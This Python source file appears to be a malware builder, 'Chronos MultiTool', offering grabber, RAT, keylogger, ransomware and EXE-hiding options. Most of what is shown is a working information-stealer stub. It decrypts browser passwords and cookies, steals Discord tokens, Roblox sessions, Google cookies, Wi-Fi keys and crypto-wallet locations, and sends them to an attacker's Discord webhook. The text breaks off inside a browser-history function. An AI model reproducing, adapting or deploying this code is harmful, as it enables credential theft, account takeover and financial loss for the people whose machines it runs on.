#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CHRONOS MULTITOOL – Free Edition 
==========================================================
Version: 2.2.5 – release 
Author: Wasd
FEATURES:

[1] Build Grabber      – -base stealer features – 
[2] Build RAT          – essential remote commands + limited stealing
[3] Build Keylogger    – standalone keylogger 
[4] Build Ransomware   – standalone file encryptor (kinda shit might upgrade later)
[5] Obfuscator         – obfuscate Python scripts (shit aswell)
[6] Script to EXE      – compile any Python script to EXE (shit)
[7] EXE to Image       – hide EXE inside PNG image (dogshit)
[0] Exit
"""
import os
import sys
import json
import base64
import subprocess
import shutil
import time
import random
from pathlib import Path
import socket
import webbrowser
import getpass
import hashlib
import platform
import glob
import copy
import ast
import marshal
import zlib
import struct
import tempfile
import importlib
import warnings
warnings.filterwarnings("ignore", category=UserWarning)
# ===== FIX: Force console to UTF-8 on Windows =====
if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleCP(65001)
        ctypes.windll.kernel32.SetConsoleOutputCP(65001)
    except:
        pass
# Colorama setup (if ur a skid) – but we only use ANSI codes
# ------------------------------------------------------------------
# Dependency Check
# ------------------------------------------------------------------
REQUIRED_MODULES = {
    'colorama': 'colorama',
    'Crypto': 'pycryptodome',
    'PyInstaller': 'pyinstaller',
}
def check_dependencies():
    missing = []
    for mod, pkg in REQUIRED_MODULES.items():
        try:
            importlib.import_module(mod)
        except ImportError:
            missing.append(pkg)
    if missing:
        print(f"[!] Missing required packages: {', '.join(missing)}")
        print("[!] Install them with: pip install " + " ".join(missing))
        if 'pycryptodome' in missing:
            print("[!] Note: pycryptodome is needed for obfuscation and encryption.")
        if 'pyinstaller' in missing:
            print("[!] PyInstaller is needed for compiling to EXE.")
        return False
    return True
if not check_dependencies():
    sys.exit(1)
# ------------------------------------------------------------------
# Colorama setup (fallback if missing) – but we only use ANSI codes
# ------------------------------------------------------------------
try:
    from colorama import Fore, init
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        RESET = '\033[0m'
    init = lambda **kwargs: None
# ------------------------------------------------------------------
# CHRONOS LINKS – ASCII ONLY
# ------------------------------------------------------------------
CHRONOS_GITHUB = "https://github.com/ChronosToolsDev/Chronos-MultiTool"
CHRONOS_YOUTUBE = "https://www.youtube.com/channel/UChmh2NDBPgdDTG3Cqy4TT1A"
CHRONOS_DISCORD = "https://discord.gg/sXzpE6TmbB"
LOGO = """
.d8888b.  888                                                                             888 888    d8b      888                     888
d88P  Y88b 888                                                                             888 888    Y8P      888                     888
888    888 888                                                                             888 888             888                     888
888        88888b.  888d888 .d88b.  88888b.   .d88b.  .d8888b       88888b.d88b.  888  888 888 888888 888      888888 .d88b.   .d88b.  888
888        888 "88b 888P"  d88""88b 888 "88b d88""88b 88K           888 "888 "88b 888  888 888 888    888      888   d88""88b d88""88b 888
888    888 888  888 888    888  888 888  888 888  888 "Y8888b.      888  888  888 888  888 888 888    888      888   888  888 888  888 888
Y88b  d88P 888  888 888    Y88..88P 888  888 Y88..88P      X88      888  888  888 Y88b 888 888 Y88b.  888      Y88b. Y88..88P Y88..88P 888
"Y8888P"  888  888 888     "Y88P"  888  888  "Y88P"   88888P'      888  888  888  "Y88888 888  "Y888 888       "Y888 "Y88P"   "Y88P"  888
"""
def print_banner():
    for line in LOGO.split("\n"):
        coloured = ""
        for i, char in enumerate(line):
            if char != " ":
                if i % 2 == 0:
                    coloured += Fore.GREEN + char
                else:
                    coloured += Fore.CYAN + char
            else:
                coloured += " "
        print(coloured)
def print_chronos_links():
    # All ASCII – no box drawing characters
    print(f"{Fore.MAGENTA}+{'-'*68}+{Fore.RESET}")
    print(f"{Fore.MAGENTA}|  {Fore.CYAN}Chronos GitHub:  {Fore.WHITE}{CHRONOS_GITHUB}{Fore.MAGENTA}  |")
    print(f"{Fore.MAGENTA}|  {Fore.CYAN}Chronos YouTube: {Fore.WHITE}{CHRONOS_YOUTUBE}{Fore.MAGENTA}  |")
    print(f"{Fore.MAGENTA}|  {Fore.CYAN}Chronos Discord: {Fore.WHITE}{CHRONOS_DISCORD}{Fore.MAGENTA}  |")
    print(f"{Fore.MAGENTA}+{'-'*68}+{Fore.RESET}")
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')
    try:
        os.system('mode con: cols=110 lines=35')
    except:
        pass
def pause():
    input(f"\n{Fore.WHITE}Press Enter to continue...{Fore.RESET}")
class Colors:
    HEADER = Fore.MAGENTA
    BLUE = Fore.BLUE
    CYAN = Fore.CYAN
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    RED = Fore.RED
    MAGENTA = Fore.MAGENTA
    WHITE = Fore.WHITE
    GRAY = Fore.LIGHTBLACK_EX
    BOLD = '\033[1m'
    RESET = Fore.RESET
# ============================================================================
# STUB_GRABBER – FULL v10 chrome decription and discord token stealing + other good stuff
# ============================================================================
STUB_GRABBER = r'''
import sys
import os
try:
    with open(os.path.join(os.environ.get('TEMP', 'C:\\'), 'grabber_start.txt'), 'w') as f:
        f.write('INTERPRETER STARTED\n')
except:
    pass
try:
    import warnings
    warnings.filterwarnings("ignore", category=UserWarning)
    import datetime
    import urllib.request
    import urllib.error
    import random
    import ctypes
    from ctypes import wintypes
    import sqlite3
    import winreg
    import psutil
    import platform
    import win32clipboard
    import win32con
    import hashlib
    import win32security
    import win32api
    import win32file
    import win32net
    import socket
    import threading
    import math
    import json
    import base64
    import subprocess
    import re
    import shutil
    import tempfile
    import time
    import zipfile
    import io
    import binascii
    import struct
    import ssl
    import uuid
    import win32com.client
    try:
        import win32crypt
    except Exception:
        win32crypt = None
    try:
        from Crypto.Cipher import AES
    except Exception:
        AES = None
except Exception as e:
    try:
        with open(os.path.join(os.environ.get('TEMP', 'C:\\'), 'grabber_import_error.txt'), 'w') as f:
            f.write(f'IMPORT ERROR: {e}\n')
    except:
        pass
    raise
WEBHOOK_URL = "REPLACE_WITH_WEBHOOK"
STEAM_PATHS = [
    os.path.join(os.getenv("PROGRAMFILES(X86)", ""), "Steam", "config", "loginusers.vdf"),
    os.path.join(os.getenv("PROGRAMFILES", ""), "Steam", "config", "loginusers.vdf"),
]
EPIC_PATHS = [
    os.path.join(os.getenv("LOCALAPPDATA", ""), "Epic Games", "Launcher", "Saved", "Config", "Windows", "GameUserSettings.ini"),
]
TELEGRAM_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "Telegram Desktop", "tdata"),
]
WHATSAPP_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "WhatsApp"),
]
VPN_PATHS = [
    os.path.join(os.getenv("APPDATA", ""), "NordVPN"),
    os.path.join(os.getenv("APPDATA", ""), "ExpressVPN"),
    os.path.join(os.getenv("PROGRAMDATA", ""), "ProtonVPN"),
    os.path.join(os.getenv("APPDATA", ""), "Windscribe"),
    os.path.join(os.getenv("APPDATA", ""), "Surfshark"),
]
# ---------- WebhookSender ----------
class WebhookSender:
    def __init__(self, url):
        self.url = url
        self.ctx = ssl._create_unverified_context()
    def _post(self, data, headers, retries=3):
        for attempt in range(retries):
            try:
                req = urllib.request.Request(self.url, data=data, headers=headers)
                resp = urllib.request.urlopen(req, context=self.ctx, timeout=15)
                if resp.getcode() in (200, 204):
                    return True
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        retry_after = float(e.headers.get('Retry-After', 1))
                    except Exception:
                        retry_after = 1.0
                    time.sleep(retry_after + 0.2)
                    continue
                return False
            except Exception:
                time.sleep(0.5 * (attempt + 1))
                return False
    def _send_embed(self, title, description, fields=None, color=0x1A1A1A, thumbnail=None, footer=None):
        embed = {
            'title': title,
            'description': description,
            'color': color,
            'fields': fields or [],
        }
        if thumbnail:
            embed['thumbnail'] = {'url': thumbnail}
        if footer:
            embed['footer'] = {'text': footer}
        payload = {'embeds': [embed]}
        self._post(json.dumps(payload).encode('utf-8'),
                   {'Content-Type':'application/json','User-Agent':'Mozilla/5.0'})
    def send_system_info(self, sid, user, ip, computer, extra, geo):
        title = 'System Intelligence'
        geo_str = f"\n[GEOLOCATION]\nIP: {ip}\nCity: {geo.get('city','Unknown')}\nRegion: {geo.get('regionName','Unknown')}\nCountry: {geo.get('country','Unknown')}\nZIP: {geo.get('zip','Unknown')}\nCoordinates: {geo.get('lat','?')}, {geo.get('lon','?')}\nISP: {geo.get('isp','Unknown')}\nTimezone: {geo.get('timezone','Unknown')}"
        desc = f'```\nSID: {sid}\nUser: {user}\nComputer: {computer}\n{extra}\n{geo_str}\n```'
        self._send_embed(title, desc, color=0x2C2C2C, footer='Chronos | Silent Harvest')
    def send_discord_info(self, username, discrim, user_id, email, phone, token):
        title = f'Discord Account – {username}#{discrim}'
        desc = f'**User ID:** `{user_id}`\n**Email:** `{email if email else "None"}`\n**Phone:** `{phone if phone else "None"}`'
        fields = [{'name': 'Token', 'value': f'```\n{token}\n```', 'inline': False}]
        self._send_embed(title, desc, fields, color=0x5865F2, footer='Discord Token Exfil')
    def send_roblox_info(self, username, displayname, user_id, robux, avatar_url, cookie, browser, password):
        title = f'Roblox Session – {displayname}'
        desc = f'**Browser:** {browser}\n**User ID:** `{user_id}`\n**Robux:** `{robux}`'
        fields = []
        if password:
            fields.append({'name': 'Saved Password', 'value': f'```\n{password}\n```', 'inline': False})
        else:
            fields.append({'name': 'Saved Password', 'value': 'Not saved in browser', 'inline': False})
        fields.append({'name': 'Cookie', 'value': f'```\n{cookie}\n```', 'inline': False})
        self._send_embed(title, desc, fields, color=0x00A8FF, thumbnail=avatar_url, footer='Roblox Session & Credentials')
    def send_google_info(self, email, password, cookie_str):
        title = 'Google Account (including Edge)'
        desc = f'**Email:** `{email}`'
        fields = []
        if password:
            fields.append({'name': 'Saved Password', 'value': f'```\n{password}\n```', 'inline': False})
        else:
            fields.append({'name': 'Saved Password', 'value': 'Not saved in browser', 'inline': False})
        if cookie_str:
            fields.append({'name': 'Session Cookies', 'value': f'```\n{cookie_str}\n```', 'inline': False})
        self._send_embed(title, desc, fields, color=0xEA4335, footer='Google Account Exfil (Edge Included)')
    def send_text(self, text, title='Data'):
        self._send_embed(title, f'```\n{text[:3900]}\n```', color=0x333333)
    def send_file(self, filepath, title='File'):
        if not os.path.exists(filepath): return
        boundary = '----WebKitFormBoundary' + str(uuid.uuid4())
        with open(filepath, 'rb') as f: data = f.read()
        filename = os.path.basename(filepath)
        payload = {'embeds': [{'title': title, 'color': 0x333333, 'footer': {'text': 'Chronos | File Dump'}}]}
        body = (f'--{boundary}\r\nContent-Disposition: form-data; name="payload_json"\r\n'
                f'Content-Type: application/json\r\n\r\n{json.dumps(payload)}\r\n'
                f'--{boundary}\r\nContent-Disposition: form-data; name="file"; filename="{filename}"\r\n'
                f'Content-Type: application/octet-stream\r\n\r\n').encode('utf-8') + data + f'\r\n--{boundary}--\r\n'.encode('utf-8')
        self._post(body, {'Content-Type': f'multipart/form-data; boundary={boundary}',
                          'User-Agent':'Mozilla/5.0'})
# ---------- CryptoMaster – NO V20 ----------
class CryptoMaster:
    @staticmethod
    def get_v10_key(local_state_path):
        if not os.path.exists(local_state_path): return None
        if win32crypt is None:
            return None
        try:
            with open(local_state_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            key = base64.b64decode(data['os_crypt']['encrypted_key'])[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return None
    @staticmethod
    def decrypt_any(data, v10_key):
        if not data:
            return ''
        try:
            if data[:3] == b'v10' and v10_key and AES is not None:
                iv = data[3:15]
                ct = data[15:-16]
                tag = data[-16:]
                cipher = AES.new(v10_key, AES.MODE_GCM, nonce=iv)
                return cipher.decrypt_and_verify(ct, tag).decode('utf-8', errors='ignore')
            else:
                if win32crypt is not None:
                    return win32crypt.CryptUnprotectData(data, None, None, None, 0)[1].decode('utf-8', errors='ignore')
                else:
                    return ''
        except Exception:
            return ''
# ---------- ChronosStealer ----------
class ChronosStealer:
    def __init__(self, webhook):
        self.webhook = webhook
        self.sid = hashlib.md5(f"{os.environ.get('COMPUTERNAME','NODE')}-{uuid.getnode()}".encode()).hexdigest()[:8].upper()
        self.user = self._get_user()
        self.ip = self._get_ip()
        self.temp = os.environ.get('TEMP', '')
        self.start_time = datetime.datetime.now()
    def _get_user(self):
        try:
            user = os.environ.get('USERNAME')
            if user and user.upper() != 'SYSTEM':
                return user
            output = subprocess.check_output('tasklist /FI "IMAGENAME eq explorer.exe" /V /FO CSV', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
            import csv
            for row in csv.reader(io.StringIO(output)):
                if len(row) > 6 and "explorer.exe" in row[0]:
                    owner = row[6]
                    if "\\" in owner:
                        return owner.split("\\")[-1]
                    return owner
        except:
            pass
        return os.environ.get('USERNAME', 'Unknown')
    def _get_ip(self):
        try:
            return urllib.request.urlopen('https://api64.ipify.org', context=ssl._create_unverified_context(), timeout=5).read().decode()
        except:
            return 'Unknown'
    def _get_geolocation(self):
        try:
            req = urllib.request.Request('http://ip-api.com/json/', headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read().decode())
            return {
                'city': data.get('city', 'Unknown'),
                'regionName': data.get('regionName', 'Unknown'),
                'country': data.get('country', 'Unknown'),
                'zip': data.get('zip', 'Unknown'),
                'lat': data.get('lat', '?'),
                'lon': data.get('lon', '?'),
                'isp': data.get('isp', 'Unknown'),
                'timezone': data.get('timezone', 'Unknown')
            }
        except:
            return {
                'city': 'Unknown',
                'regionName': 'Unknown',
                'country': 'Unknown',
                'zip': 'Unknown',
                'lat': '?',
                'lon': '?',
                'isp': 'Unknown',
                'timezone': 'Unknown'
            }
    def _copy_db_safe(self, src, dst):
        for _ in range(3):
            try:
                shutil.copyfile(src, dst); return True
            except:
                time.sleep(0.5)
        return False
    def _get_user_path(self):
        user = self._get_user()
        if user.upper() in ['SYSTEM','NETWORK SERVICE','LOCAL SERVICE','UNKNOWN']:
            try:
                output = subprocess.check_output('tasklist /FI "IMAGENAME eq explorer.exe" /V /FO CSV', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
                import csv
                for row in csv.reader(io.StringIO(output)):
                    if "explorer.exe" in row[0] and "\\" in row[6]:
                        user = row[6].split("\\")[-1]
                        break
            except:
                pass
        drive = os.environ.get('SystemDrive', 'C:')
        path = os.path.join(drive, 'Users', user)
        if os.path.exists(path):
            return path
        users_dir = os.path.join(drive, 'Users')
        try:
            subdirs = [os.path.join(users_dir, d) for d in os.listdir(users_dir) if os.path.isdir(os.path.join(users_dir, d)) and d not in ['Public','Default','All Users']]
            if subdirs:
                return max(subdirs, key=os.path.getmtime)
        except:
            pass
        return os.environ.get('USERPROFILE', 'Unknown')
    def get_browser_roots(self):
        L = os.path.join(self._get_user_path(), "AppData", "Local")
        R = os.path.join(self._get_user_path(), "AppData", "Roaming")
        return {
            "Google Chrome": os.path.join(L, "Google", "Chrome", "User Data"),
            "Microsoft Edge": os.path.join(L, "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(L, "BraveSoftware", "Brave-Browser", "User Data"),
            "Opera": os.path.join(R, "Opera Software", "Opera Stable"),
            "Opera GX": os.path.join(R, "Opera Software", "Opera GX Stable")
        }
    def gather_system(self):
        lines = []
        try:
            ps = "$os = Get-WmiObject Win32_OperatingSystem; $cpu = Get-WmiObject Win32_Processor; $gpu = Get-WmiObject Win32_VideoController; $av = Get-WmiObject -Namespace root\\SecurityCenter2 -Class AntiVirusProduct; \"OS: $($os.Caption)`nProduct Key: $($os.SerialNumber)`nCPU: $($cpu.Name)`nGPU: $($gpu.Name)`nAV: $($av.displayName)\""
            out = subprocess.check_output(['powershell','-command',ps], text=True, creationflags=subprocess.CREATE_NO_WINDOW).strip()
            lines.append(out)
        except:
            lines.append('[System info failed]')
        geo = self._get_geolocation()
        self.webhook.send_system_info(self.sid, self._get_user(), self.ip, os.environ.get('COMPUTERNAME',''), '\n'.join(lines), geo)
    def gather_discord(self):
        L = os.path.join(self._get_user_path(), "AppData", "Local")
        R = os.path.join(self._get_user_path(), "AppData", "Roaming")
        paths = {
            'Discord': R+'\\discord', 'Discord Canary': R+'\\discordcanary',
            'Chrome': L+'\\Google\\Chrome\\User Data\\Default',
            'Brave': L+'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Edge': L+'\\Microsoft\\Edge\\User Data\\Default'
        }
        found = []
        for platform, base_path in paths.items():
            if not os.path.exists(base_path): continue
            leveldb = os.path.join(base_path, 'Local Storage', 'leveldb')
            if not os.path.exists(leveldb): continue
            for f in os.listdir(leveldb):
                if not (f.endswith('.ldb') or f.endswith('.log')): continue
                try:
                    with open(os.path.join(leveldb, f), 'r', errors='ignore') as fp:
                        for line in fp:
                            for match in re.findall(r'dQw4w9WgXcQ:[^"\']+', line):
                                token_enc = match.replace('\\','')
                                try:
                                    local_state = os.path.join(base_path, 'Local State')
                                    if not os.path.exists(local_state):
                                        local_state = os.path.join(os.path.dirname(base_path), 'Local State')
                                    if not os.path.exists(local_state): continue
                                    with open(local_state, 'r') as lf:
                                        ldata = json.load(lf)
                                    enc_key = base64.b64decode(ldata['os_crypt']['encrypted_key'])[5:]
                                    key = win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
                                    parts = token_enc.split('dQw4w9WgXcQ:')[1]
                                    dec = AES.new(key, AES.MODE_GCM, base64.b64decode(parts)[3:15]).decrypt(base64.b64decode(parts)[15:])[:-16].decode()
                                    if dec:
                                        found.append((dec, platform))
                                except:
                                    pass
                except:
                    pass
        ctx = ssl._create_unverified_context()
        for token, platform in found:
            try:
                req = urllib.request.Request('https://discord.com/api/v10/users/@me',
                                             headers={'Authorization': token, 'User-Agent': 'Mozilla/5.0'})
                resp = urllib.request.urlopen(req, context=ctx, timeout=10)
                if resp.status == 200:
                    user_data = json.loads(resp.read().decode())
                    username = user_data.get('username', 'Unknown')
                    discrim = user_data.get('discriminator', '0000')
                    user_id = user_data.get('id', '')
                    email = user_data.get('email', '')
                    phone = user_data.get('phone', '')
                    self.webhook.send_discord_info(username, discrim, user_id, email, phone, token)
                    return
            except:
                continue
        self.webhook.send_text('No valid Discord token found.', 'Discord Session Missing')
    def gather_passwords(self):
        roots = self.get_browser_roots()
        extracted = []
        for browser, root in roots.items():
            if not os.path.exists(root): continue
            local_state = os.path.join(root, 'Local State')
            if not os.path.exists(local_state): continue
            v10_key = CryptoMaster.get_v10_key(local_state)
            if v10_key is None:
                continue
            for profile in ['Default'] + [f'Profile {i}' for i in range(1,20)] + ['.']:
                db_path = os.path.join(root, profile, 'Login Data')
                if not os.path.exists(db_path): continue
                tmp = os.path.join(self.temp, f'pass_{uuid.uuid4().hex[:6]}.db')
                if not self._copy_db_safe(db_path, tmp): continue
                try:
                    db = sqlite3.connect(tmp)
                    cur = db.cursor()
                    cur.execute('SELECT origin_url, username_value, password_value FROM logins')
                    for url, user, blob in cur.fetchall():
                        pwd = CryptoMaster.decrypt_any(blob, v10_key)
                        if user or pwd:
                            extracted.append(f'[{browser}|{profile}] {url} | User: {user} | Pass: {pwd}')
                    db.close()
                except:
                    pass
                finally:
                    try: os.remove(tmp)
                    except: pass
        if extracted:
            fname = os.path.join(self.temp, f'passwords_{uuid.uuid4().hex[:6]}.txt')
            with open(fname, 'w', encoding='utf-8') as f:
                f.write('\n'.join(extracted))
            self.webhook.send_file(fname, 'Passwords Dump')
            try: os.remove(fname)
            except: pass
        else:
            self.webhook.send_text('No passwords found.', 'Passwords')
    def gather_roblox(self):
        roots = self.get_browser_roots()
        cookies = []
        passwords = {}
        for browser, root in roots.items():
            if not os.path.exists(root): continue
            local_state = os.path.join(root, 'Local State')
            if not os.path.exists(local_state): continue
            v10_key = CryptoMaster.get_v10_key(local_state)
            if v10_key is None:
                continue
            for profile in ['Default'] + [f'Profile {i}' for i in range(1,20)] + ['.']:
                db_path = os.path.join(root, profile, 'Network', 'Cookies')
                if not os.path.exists(db_path):
                    db_path = os.path.join(root, profile, 'Cookies')
                if os.path.exists(db_path):
                    tmp = os.path.join(self.temp, f'cookie_{uuid.uuid4().hex[:6]}.db')
                    if self._copy_db_safe(db_path, tmp):
                        try:
                            db = sqlite3.connect(tmp)
                            cur = db.cursor()
                            cur.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
                            for host, name, value, enc in cur.fetchall():
                                dec = CryptoMaster.decrypt_any(enc, v10_key) if enc else value
                                if name == '.ROBLOSECURITY' and dec:
                                    match = re.search(r'(_\|WARNING:-DO-NOT-SHARE-THIS[^;"\'\s]+)', dec)
                                    if match:
                                        cookies.append((browser, match.group(1)))
                            db.close()
                        except:
                            pass
                        finally:
                            try: os.remove(tmp)
                            except: pass
                login_db = os.path.join(root, profile, 'Login Data')
                if os.path.exists(login_db):
                    tmp_pass = os.path.join(self.temp, f'pass_roblox_{uuid.uuid4().hex[:6]}.db')
                    if self._copy_db_safe(login_db, tmp_pass):
                        try:
                            db = sqlite3.connect(tmp_pass)
                            cur = db.cursor()
                            cur.execute("SELECT origin_url, username_value, password_value FROM logins WHERE origin_url LIKE '%roblox.com%'")
                            rows = cur.fetchall()
                            if rows:
                                url, user, blob = rows[0]
                                pwd = CryptoMaster.decrypt_any(blob, v10_key)
                                if user and pwd:
                                    passwords[browser] = (user, pwd)
                            db.close()
                        except:
                            pass
                        finally:
                            try: os.remove(tmp_pass)
                            except: pass
        try:
            rb_path = os.path.join(os.path.join(self._get_user_path(), "AppData", "Local"), 'Roblox', 'LocalStorage', 'robloxcookies.dat')
            if os.path.exists(rb_path):
                with open(rb_path, 'r', encoding='utf-8') as f:
                    rb_data = json.load(f).get('CookiesData', '')
                if rb_data:
                    dec = win32crypt.CryptUnprotectData(base64.b64decode(rb_data), None, None, None, 0)[1].decode(errors='ignore')
                    for m in re.findall(r'(_\|WARNING:-DO-NOT-SHARE-THIS[^;"\'\s]+)', dec):
                        cookies.append(('Roblox Desktop', m))
        except:
            pass
        ctx = ssl._create_unverified_context()
        for browser, cookie in cookies:
            try:
                req = urllib.request.Request('https://users.roblox.com/v1/users/authenticated',
                                             headers={'Cookie': f'.ROBLOSECURITY={cookie}', 'User-Agent': 'Mozilla/5.0'})
                resp = urllib.request.urlopen(req, context=ctx, timeout=10)
                user_data = json.loads(resp.read().decode())
                user_id = user_data.get('id')
                username = user_data.get('name')
                displayname = user_data.get('displayName')
                req2 = urllib.request.Request(f'https://economy.roblox.com/v1/users/{user_id}/currency',
                                              headers={'Cookie': f'.ROBLOSECURITY={cookie}', 'User-Agent': 'Mozilla/5.0'})
                resp2 = urllib.request.urlopen(req2, context=ctx, timeout=10)
                econ_data = json.loads(resp2.read().decode())
                robux = econ_data.get('robux', 0)
                req3 = urllib.request.Request(f'https://thumbnails.roblox.com/v1/users/avatar?userIds={user_id}&size=720x720&format=Png&isCircular=false',
                                              headers={'User-Agent': 'Mozilla/5.0'})
                resp3 = urllib.request.urlopen(req3, context=ctx, timeout=10)
                thumb_data = json.loads(resp3.read().decode())
                avatar_url = thumb_data.get('data', [{}])[0].get('imageUrl', '')
                password = None
                if browser in passwords:
                    pwd_user, pwd = passwords[browser]
                    password = f'{pwd_user} : {pwd}'
                else:
                    for b, (u, p) in passwords.items():
                        password = f'{u} : {p}'
                        break
                self.webhook.send_roblox_info(username, displayname, user_id, robux, avatar_url, cookie, browser, password)
                return
            except:
                continue
        self.webhook.send_text('No active Roblox session found.', 'Roblox Session Missing')
    def gather_google(self):
        roots = self.get_browser_roots()
        google_cookies = []
        google_password = None
        for browser, root in roots.items():
            if not os.path.exists(root): continue
            local_state = os.path.join(root, 'Local State')
            if not os.path.exists(local_state): continue
            v10_key = CryptoMaster.get_v10_key(local_state)
            if v10_key is None:
                continue
            for profile in ['Default'] + [f'Profile {i}' for i in range(1,20)] + ['.']:
                db_path = os.path.join(root, profile, 'Network', 'Cookies')
                if not os.path.exists(db_path):
                    db_path = os.path.join(root, profile, 'Cookies')
                if os.path.exists(db_path):
                    tmp = os.path.join(self.temp, f'gcookie_{uuid.uuid4().hex[:6]}.db')
                    if self._copy_db_safe(db_path, tmp):
                        try:
                            db = sqlite3.connect(tmp)
                            cur = db.cursor()
                            cur.execute("SELECT name, value, encrypted_value FROM cookies WHERE host_key LIKE '%accounts.google.com%'")
                            rows = cur.fetchall()
                            cookie_dict = {}
                            for name, value, enc in rows:
                                if enc:
                                    dec = CryptoMaster.decrypt_any(enc, v10_key)
                                    if dec:
                                        cookie_dict[name] = dec
                                elif value:
                                    cookie_dict[name] = value
                            if cookie_dict:
                                google_cookies.append((browser, cookie_dict))
                            db.close()
                        except:
                            pass
                        finally:
                            try: os.remove(tmp)
                            except: pass
                login_db = os.path.join(root, profile, 'Login Data')
                if os.path.exists(login_db):
                    tmp_pass = os.path.join(self.temp, f'gpass_{uuid.uuid4().hex[:6]}.db')
                    if self._copy_db_safe(login_db, tmp_pass):
                        try:
                            db = sqlite3.connect(tmp_pass)
                            cur = db.cursor()
                            cur.execute("SELECT username_value, password_value FROM logins WHERE origin_url LIKE '%accounts.google.com%' OR origin_url LIKE '%google.com%'")
                            rows = cur.fetchall()
                            if rows:
                                user, blob = rows[0]
                                pwd = CryptoMaster.decrypt_any(blob, v10_key)
                                if user and pwd:
                                    google_password = f'{user} : {pwd}'
                            db.close()
                        except:
                            pass
                        finally:
                            try: os.remove(tmp_pass)
                            except: pass
        ctx = ssl._create_unverified_context()
        for browser, cookies in google_cookies:
            try:
                cookie_str = '; '.join([f'{k}={v}' for k,v in cookies.items()])
                req = urllib.request.Request('https://accounts.google.com/ListAccounts?gpsia=1&source=mail&json=1',
                                             headers={'Cookie': cookie_str, 'User-Agent': 'Mozilla/5.0'})
                resp = urllib.request.urlopen(req, context=ctx, timeout=10)
                data = json.loads(resp.read().decode())
                if data and data.get('data'):
                    accounts = data['data']
                    if accounts:
                        email = accounts[0].get('email')
                        if email:
                            self.webhook.send_google_info(email, google_password, cookie_str)
                            return
            except:
                continue
        if google_password:
            self.webhook.send_google_info('Unknown (password found)', google_password, 'No valid session cookies')
        else:
            self.webhook.send_text('No Google account session or password found.', 'Google Account Missing')
    def gather_wifi(self):
        try:
            ps = "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $name = $_.ToString().Split(':')[1].Trim(); netsh wlan show profile name=\"$name\" key=clear | Select-String 'Key Content' | ForEach-Object { $pass = $_.ToString().Split(':')[1].Trim(); \"SSID: $name | PASS: $pass\" } }"
            out = subprocess.check_output(['powershell','-command',ps], text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW).strip()
            if out:
                self.webhook.send_text(out, 'Wi-Fi Passwords')
            else:
                self.webhook.send_text('None found', 'Wi-Fi Passwords')
        except:
            self.webhook.send_text('Failed to retrieve', 'Wi-Fi Passwords')
    def gather_wallets(self):
        L = os.path.join(self._get_user_path(), "AppData", "Local")
        R = os.path.join(self._get_user_path(), "AppData", "Roaming")
        paths = {
            'Exodus': R+'\\Exodus', 'Atomic': R+'\\atomic', 'Electrum': R+'\\Electrum\\wallets',
            'Ethereum': R+'\\Ethereum\\keystore', 'Armory': R+'\\Armory', 'Zcash': R+'\\Zcash',
            'Binance': R+'\\Binance', 'MetaMask': L+'\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn'
        }
        found = [name for name, p in paths.items() if os.path.exists(p)]
        if found:
            self.webhook.send_text('\n'.join(found), 'Crypto Wallets')
        else:
            self.webhook.send_text('None detected', 'Crypto Wallets')
    def run(self):
        self.webhook.send_text(f'SID {self.sid} | Harvest initiated', 'Session Start')
        self.gather_system()
        self.gather_discord()
        self.gather_passwords()
        self.gather_roblox()
        self.gather_google()
        self.gather_wifi()
        self.gather_wallets()
        self.webhook.send_text(f'SID {self.sid} | Harvest completed at {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}', 'Session End')
# ---------- Helper functions for grabber ----------
def log_msg(msg):
    pass
def copy_to_temp(source_path):
    if not os.path.exists(source_path):
        return None
    dest = os.path.join(tempfile.gettempdir(), "~" + str(os.getpid()) + str(abs(hash(source_path)) % 99991) + ".dat")
    try:
        shutil.copy2(source_path, dest)
        return dest
    except:
        return None
def convert_chrome_time(microseconds):
    try:
        if not microseconds:
            return "?"
        epoch = datetime.datetime(1601, 1, 1)
        dt = epoch + datetime.timedelta(microseconds=microseconds)
        return dt.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "?"
def extract_history(user_data_path, browser, profile="Default"):
    results = []
    history_db = os.path.join(user_data_path, profile, "History")
    if not os.path.exists(history_db):
        return results
    temp_db = copy_to_temp(history_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        for url, title, visit_time, visit_count in conn.execute(
                "SELECT url, title, last_visit_time, visit_count FROM urls ORDER BY last_visit_time DESC"):
            date = convert_chrome_time(visit_time)
            results.append((browser, profile, date, str(visit_count or 0), (title or "")[:200], (url or "")[:500]))
        conn.close()
    except:
        pass
    finally:
        try:
            os.remove(temp_db)
        except:
            pass
    return results
def extract_firefox_history(profile_path):
    results = []
    history_db = os.path.join(profile_path, "places.sqlite")
    if not os.path.exists(history_db):
        return results
    temp_db = copy_to_temp(history_db)
    if not temp_db:
        return results
    try:
        conn = sqlite3.connect(temp_db)
        for url, title, visit_count, visit_date in conn.execute(
                "SELECT p.url, p.title, p.visit_count, h.visit_date FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id ORDER BY h.visit_date DESC"):
            date = "?"
            try:
                if visit_date:
